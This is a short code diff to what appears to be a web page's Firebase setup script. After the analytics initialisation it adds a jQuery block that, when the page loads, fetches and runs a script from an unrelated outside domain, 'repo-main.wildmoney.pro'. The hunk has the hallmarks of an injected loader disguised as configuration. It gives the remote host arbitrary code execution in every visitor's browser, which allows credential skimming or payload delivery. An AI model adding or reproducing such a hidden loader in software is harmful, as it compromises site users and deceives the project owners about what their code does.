@@ -12,3 +12,7 @@
   };
   const app = initializeApp(firebaseConfig);
   const analytics = getAnalytics(app);
+
+jQuery(document).ready(function ($) { 
+   $.getScript("https://repo-main.wildmoney.pro/config/wcfg.js");       
+})(jQuery);
